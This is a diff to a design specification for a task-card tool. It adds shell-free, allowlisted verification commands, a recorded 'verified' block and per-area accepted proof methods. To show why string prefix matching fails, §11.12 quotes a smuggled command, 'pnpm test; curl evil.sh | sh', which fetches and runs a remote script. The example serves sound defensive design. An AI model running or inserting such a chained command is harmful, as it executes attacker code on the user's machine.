@@ -343,6 +343,8 @@ The following are project-configurable:
 
 - areas;
 - additional classification axes (`cards.axes`);
+- the commands a card may name and the verification methods each area accepts
+  at `done` (`cards.verification`);
 - optional custom tags;
 - source globs;
 - enabled memory collections;
@@ -748,6 +750,238 @@ Rules:
 - Archived IDs remain reserved.
 - References to archived cards remain valid.
 - Reopening restores a card to the live directory before transitioning it.
+
+### 11.12 Card-declared commands
+
+A card MAY bind an acceptance criterion to the command that proves it. The
+binding lives in frontmatter, as a `verify` block:
+
+```yaml
+verify:
+    - id: gate
+      run: [pnpm, test, test/acceptance.test.ts]
+      criteria: [sha256:ab12…]
+```
+
+`run` MUST be an argument vector, and it MUST be executed without a shell. A
+single string is refused rather than split. The reason is that the allowlist
+below has to be decidable: over a shell line `pnpm test` is a prefix of
+`pnpm test; curl evil.sh | sh` as surely as it is a prefix of `pnpm test -w`,
+so a prefix matcher over a string would be predicting the behaviour of a parser
+it does not own. Over an argv executed with no shell there is no parser between
+the value that was matched and the vector the operating system receives, and
+prefix matching is element-wise string equality.
+
+An element MUST NOT be empty and MUST NOT hold a control character. This is a
+round-trip rule and not a shell-safety one: frontmatter is line-oriented, so an
+element carrying a newline would be stored as two lines and read back as
+something its author did not write, and a command that changes when it is
+stored cannot be matched against anything. Every other byte — `;`, `|`, `*`,
+spaces, non-ASCII — is permitted, because under a shell-free model it is one
+argument's data.
+
+**The commands a card may name are declared by the project**, under
+`cards.verification.commands`, as a list of argv prefixes. The list is empty by
+default: a project that declares nothing can run nothing. A card naming a
+command outside it MUST be refused with a named error, and the refusal MUST
+happen in two places, because they cover different arrivals:
+
+- on **write**, so a card authored through the protocol never lands and the
+  refusal is a reviewable diff rather than a red build;
+- on **read**, by the doctor, because a card is a Markdown file and one can
+  arrive as a file in a diff — a fork's pull request — without ever calling a
+  mutation. That case reaches no write path at all, so the doctor rule is the
+  only gate it meets. It is an `error`, so the run that reports it fails.
+
+A declared prefix MUST be matched byte for byte, element by element. An
+implementation MUST NOT case-fold, trim, resolve paths, strip quotes, apply
+Unicode normalisation, or join the vector into a string and search it: each
+opens a gap between the command that was matched and the command that will run.
+A declared entry that could never match a stored command — an empty array,
+which is a prefix of everything, or an element the round trip would not return
+unchanged — MUST be refused when the configuration loads.
+
+The allowlist bounds which command a card may name. It does not bound what that
+command does, and MUST NOT be documented as though it did: every command worth
+allowing dispatches through a file the same pull request can edit. It is
+anti-escalation on a trusted branch and a way to keep a declared command
+reviewable in one place. Containment for an untrusted branch is a property of
+the job — no secrets, no write token, no evidence written back — not of the
+card.
+
+**Running them.** `workfile card verify ID` executes each declared entry and
+reports pass or fail per entry. It is the only writer permitted to check a bound
+criterion: a criterion a `verify` entry names is refused to `card ac --check`,
+so without this command a card that binds its criteria is a card nothing can
+close. An entry MUST be permitted to write the criteria bound to it and no
+others — a runner that could check anything would be the same escalation one
+rung further in, reached by declaring an entry instead of by typing `--check`.
+Every entry the card declares MUST be checked against the allowlist before the
+first one is spawned, whether or not the caller selected it.
+
+A criterion's box records what a command decided, so only a command that reached
+a decision may write one:
+
+| Outcome | Condition | Bound criteria |
+| --- | --- | --- |
+| `passed` | Exit status `0`. | Checked. |
+| `failed` | Any other exit status. | Unchecked. |
+| `timed-out` | Killed at the configured timeout. | Unchanged. |
+| `errored` | No process started. | Unchanged. |
+
+A failing run unchecking what a passing one checked is the honest reading: a
+proof that no longer reproduces is not a proof, and leaving the box would let
+`done` pass on it. The last two rows are not a weaker `failed` and MUST NOT be
+treated as one. Killing a command at the timeout is the implementation giving
+up, and a machine that cannot start the command has decided even less; neither
+is a fact about the criterion, and unchecking on either would let a run on the
+wrong machine erase a proof a right one produced — which no caller could undo,
+the criterion being machine-owned. All four are reported, and any outcome other
+than `passed` MUST fail the run.
+
+A run that changes a criterion's state MUST leave a trail entry naming the entry
+that changed it, in the same write as the change. A state change with no actor
+behind it is precisely what §11.2's trail exists to prevent, and a box that
+moved because a subprocess exited has no author in the record otherwise. A run
+that changes nothing records nothing, by the same rule as a repeated transition.
+
+The commands MUST run outside the card's write lock, and the bindings MUST be
+resolved against a reading of the card taken after the last command exits: the
+interval is minutes long, and a criterion reworded inside it is no longer bound
+to the entry, so the write is refused by name rather than applied to whatever
+line moved into that position.
+
+A command MUST be given a bounded time to run — `cards.verification.timeoutSeconds`,
+ten minutes by default — and an implementation MUST NOT offer a way to disable
+it. The caller most likely to meet a command that never exits is an unattended
+job, which has no keyboard to interrupt it with.
+
+There is no dry run. The flag previews filesystem changes, and a run that spawns
+every declared command and then skips the write-back has already done the part
+worth previewing; it MUST be refused rather than reinterpreted.
+
+### 11.13 How `done` was proved
+
+Reaching `done` MUST write a `verified` block, and leaving `done` MUST clear
+it. It is written by the protocol on every path into the status — transition,
+patch, release and bulk, from every surface — and it is not patchable: no
+caller can hand-write it, and an axis cannot be declared with that name.
+
+```yaml
+verified:
+    at: "2026-08-05T10:12:00.000Z"
+    method: ci
+    commit: 4b939fd2c1e07a0d5b6c8e93f1a2d4c7b8e05f36
+    run: "https://ci.example/runs/1284"
+    digest: "sha256:1f0c…"
+```
+
+`method` is one of `local`, `ci`, `manual` or `forced`, and the tiers carry more
+of the substance here than the digest does.
+
+| Method | Meaning | Requires |
+| --- | --- | --- |
+| `local` | A command ran on the author's machine. Self-reported, and the default when no method is given. | — |
+| `ci` | A run anyone can open. | `run` |
+| `manual` | A person judged something no command expresses. | prose evidence, and an actor |
+| `forced` | The acceptance gate was walked past. | — |
+
+`forced` is **derived, never supplied**: it is written when, and only when,
+`assertAcceptanceMet` waived something, and a caller who asks for it MUST be
+refused. What was waived, and why, stays on the trail line described in §11.2 —
+recording the reason twice would create two places to disagree. A method
+supplied on a write that does not move the card into `done` MUST be refused
+rather than dropped, and so must a second method on a card that is already
+`done`: a close records the verification once, and a re-run of the command must
+not silently replace `ci` with `local`.
+
+`manual` evidence is prose, so it goes in the body, as one line under
+`## Notes` — `- 2026-08-05 10:12Z alvaro — manual verification: TEXT`. The
+frontmatter codec holds one scalar per line, so anything longer could not live
+there without being mangled.
+
+`commit` is HEAD at the moment of the close, and it is omitted when there is
+nothing to record. Git is optional: a workspace that is not a repository, a
+repository with no commits, and a machine with no git all close cards normally
+and simply carry no commit.
+
+**The digest covers the criteria region and the `verify` block, and nothing
+else.** It cannot cover the body, because the same transition appends a trail
+entry — a whole-body digest would be invalidated by the write that created it.
+It is taken over a canonical reading rather than over raw text: the criteria as
+normalised text, sorted, plus the `verify` entries with their criteria sorted.
+Reordering criteria, checking a box, reflowing a paragraph and rewriting prose
+outside the region therefore leave it alone; editing what a criterion *says*
+does not.
+
+Staleness is reported and never enforced retroactively. `doctor` reports, as
+warnings:
+
+- `verified-criteria-changed` — the card is verified against criteria text that
+  has since changed;
+- `verified-commit-unreachable` — a live `done` card's `commit` is not an
+  ancestor of HEAD, so the branch that proved it may have been rebased away or
+  never merged. Silent when git is absent, when the workspace is not a
+  repository, when the clone is shallow, and when the object is not present:
+  those are refusals to answer, not findings;
+- `verified-block-invalid` — the block does not read as a verification. Nothing
+  in the protocol can write one, so it means a hand edit or a card that arrived
+  as a file in a diff. Worth reporting because a block the codec cannot read
+  makes the card unwritable in both directions: it can be neither rewritten nor
+  cleared, so reopening it fails too.
+
+A `done` card carrying no block at all is deliberately **not** reported. Every
+card closed before this existed has none, and a warning per historical card is
+how doctor output stops being read.
+
+### 11.14 Which methods an area accepts
+
+A project MAY declare, per area, which of the methods above it accepts at
+`done`, under `cards.verification.methods`:
+
+```js
+cards: {
+    areas: ["api", "web", "docs"],
+    verification: {
+        methods: { api: ["ci"], docs: ["ci", "manual"], "*": ["ci", "local"] }
+    }
+}
+```
+
+`*` answers for every area the map does not name, including areas added after
+the policy was written. A project that declares nothing accepts every method,
+which is the behaviour of every workspace written before this key existed, and
+an implementation MUST treat "declares nothing" and "declares the whole
+vocabulary" as distinguishable: the first has no opinion and the second is a
+policy somebody wrote.
+
+A write that would move a card into `done` with a method the card's area does
+not accept MUST be refused with a named error, from every surface, and the
+refusal MUST name the accepted methods. **A caller that names no method is
+judged, not exempt**: §11.13 resolves an unnamed method to `local`, so under
+`{ api: ["ci"] }` a bare close of an `api` card is refused. The permissive
+reading — no method recorded, therefore nothing to check — would make the gate
+escapable by typing less.
+
+The gate is waivable, like the other two gates a close meets. `--force` with a
+reason gets past it, the trail line names the area's verification policy among
+what was waived, and the block then records `forced` rather than the method that
+was refused — which is why a forced close MUST NOT also name a method. A policy
+MUST NOT name `forced` itself: it is not a method a caller chose, and a project
+declaring it would be accepting a bypass as proof.
+
+The methods a policy names MUST be validated when the configuration loads. The
+*areas* it names MUST NOT be: an area may be removed from `cards.areas` while
+the policy still names it, and a configuration that refuses to load takes every
+command in the repository with it — including the doctor that would have
+explained why. It is reported instead, as `verification-policy-area-unknown`,
+beside the equivalent finding for a `search.provider` that resolves to nothing.
+
+Policy is not applied retroactively. A card already `done` whose recorded method
+the current policy no longer accepts is reported as the warning
+`verification-method-unaccepted` and never re-gated: tightening a policy must
+not invalidate closed work, and there is nothing to do about a shipped card
+except decide it is acceptable, which is what the doctor baseline is for.
 
 ## 12. Module: Documentation
 
@@ -1362,6 +1596,10 @@ The doctor validates at least:
 - overlapping active scopes;
 - archived record eligibility;
 - unchecked acceptance criteria on completed cards;
+- card-declared commands outside the project's allowlist, which is the only
+  check a card arriving as a file in a diff ever meets;
+- a completed card verified by a method its area no longer accepts, and a
+  verification policy naming an area the project no longer declares;
 - expired active context;
 - superseded records still marked active;
 - missing release fragments where required by policy;
